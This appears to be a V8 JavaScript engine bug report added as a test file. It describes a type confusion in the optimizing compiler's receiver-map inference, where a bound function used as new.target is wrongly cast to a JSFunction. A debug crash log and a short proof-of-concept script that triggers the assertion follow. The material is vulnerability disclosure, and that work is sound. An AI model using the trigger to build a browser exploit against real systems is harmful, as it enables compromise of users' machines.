@@ -1,0 +1,80 @@
+/*
+https://cs.chromium.org/chromium/src/v8/src/compiler/node-properties.cc?rcl=df84e87191022bf6914f9570069908f10b303245&l=416
+
+Here's a snippet of NodeProperties::InferReceiverMaps.
+      case IrOpcode::kJSCreate: {
+        if (IsSame(receiver, effect)) {
+          HeapObjectMatcher mtarget(GetValueInput(effect, 0));
+          HeapObjectMatcher mnewtarget(GetValueInput(effect, 1));
+          if (mtarget.HasValue() && mnewtarget.HasValue()) {
+            Handle<JSFunction> original_constructor =
+                Handle<JSFunction>::cast(mnewtarget.Value());
+
+            if (original_constructor->has_initial_map()) {
+              Handle<Map> initial_map(original_constructor->initial_map());
+              if (initial_map->constructor_or_backpointer() ==
+                  *mtarget.Value()) {
+                *maps_return = ZoneHandleSet<Map>(initial_map);
+                return result;
+              }
+            }
+          }
+          // We reached the allocation of the {receiver}.
+          return kNoReceiverMaps;
+        }
+        break;
+      }
+
+"mnewtarget" is expected to be a constructor which also can be of type JSBoundFunction. But "mnewtarget" is always cast to JSFunction which leads to type confusion.
+
+The PoC seems not to crash in release mode.
+
+Debug mode log:
+#
+# Fatal error in ../../src/objects-inl.h, line 566
+# Check failed: !v8::internal::FLAG_enable_slow_asserts || (object->IsJSFunction()).
+#
+
+==== C stack trace ===============================
+
+    /v8/out.gn/x64.debug/./libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x1e) [0x7f4623e1043e]
+    /v8/out.gn/x64.debug/./libv8_libplatform.so(+0x30907) [0x7f4623db3907]
+    /v8/out.gn/x64.debug/./libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x1bd) [0x7f4623df876d]
+    /v8/out.gn/x64.debug/./libv8.so(v8::internal::JSFunction::cast(v8::internal::Object*)+0x64) [0x7f46226584a4]
+    /v8/out.gn/x64.debug/./libv8.so(v8::internal::Handle<v8::internal::JSFunction> const v8::internal::Handle<v8::internal::JSFunction>::cast<v8::internal::JSFunction>(v8::internal::Handle<v8::internal::JSFunction>)+0x23) [0x7f4622651173]
+    /v8/out.gn/x64.debug/./libv8.so(v8::internal::compiler::NodeProperties::InferReceiverMaps(v8::internal::compiler::Node*, v8::internal::compiler::Node*, v8::internal::ZoneHandleSet<v8::internal::Map>*)+0x435) [0x7f4622c24a75]
+    /v8/out.gn/x64.debug/./libv8.so(v8::internal::compiler::JSNativeContextSpecialization::InferReceiverMaps(v8::internal::compiler::Node*, v8::internal::compiler::Node*, std::__1::vector<v8::internal::Handle<v8::internal::Map>, std::__1::allocator<v8::internal::Handle<v8::internal::Map> > >*)+0x50) [0x7f4622b8b820]
+    /v8/out.gn/x64.debug/./libv8.so(v8::internal::compiler::JSNativeContextSpecialization::ExtractReceiverMaps(v8::internal::compiler::Node*, v8::internal::compiler::Node*, v8::internal::FeedbackNexus const&, std::__1::vector<v8::internal::Handle<v8::internal::Map>, std::__1::allocator<v8::internal::Handle<v8::internal::Map> > >*)+0x202) [0x7f4622b82632]
+    /v8/out.gn/x64.debug/./libv8.so(v8::internal::compiler::JSNativeContextSpecialization::ReduceNamedAccessFromNexus(v8::internal::compiler::Node*, v8::internal::compiler::Node*, v8::internal::FeedbackNexus const&, v8::internal::Handle<v8::internal::Name>, v8::internal::compiler::AccessMode)+0x2e6) [0x7f4622b822b6]
+    /v8/out.gn/x64.debug/./libv8.so(v8::internal::compiler::JSNativeContextSpecialization::ReduceJSStoreNamed(v8::internal::compiler::Node*)+0x298) [0x7f4622b7c2c8]
+    /v8/out.gn/x64.debug/./libv8.so(v8::internal::compiler::JSNativeContextSpecialization::Reduce(v8::internal::compiler::Node*)+0x11f) [0x7f4622b78f7f]
+    /v8/out.gn/x64.debug/./libv8.so(v8::internal::compiler::GraphReducer::Reduce(v8::internal::compiler::Node*)+0x285) [0x7f4622ad8c55]
+    /v8/out.gn/x64.debug/./libv8.so(v8::internal::compiler::GraphReducer::ReduceTop()+0x44f) [0x7f4622ad874f]
+    /v8/out.gn/x64.debug/./libv8.so(v8::internal::compiler::GraphReducer::ReduceNode(v8::internal::compiler::Node*)+0x1bc) [0x7f4622ad7cfc]
+    /v8/out.gn/x64.debug/./libv8.so(v8::internal::compiler::GraphReducer::ReduceGraph()+0x2d) [0x7f4622ad89bd]
+    /v8/out.gn/x64.debug/./libv8.so(v8::internal::compiler::InliningPhase::Run(v8::internal::compiler::PipelineData*, v8::internal::Zone*)+0x58a) [0x7f4622c46e2a]
+
+PoC:
+*/
+
+// Flags: --allow-natives-syntax --enable_slow_asserts
+
+class Base {
+    constructor() {
+        this.x = 1;
+    }
+}
+
+class Derived extends Base {
+    constructor() {
+        // JSCreate emitted I guess.
+        super();
+    }
+}
+
+let bound = Object.bind();
+Reflect.construct(Derived, [], bound);  // Feed a bound function as new.target to the profiler, so HeapObjectMatcher can find it.
+
+%OptimizeFunctionOnNextCall(Derived);
+
+new Derived();
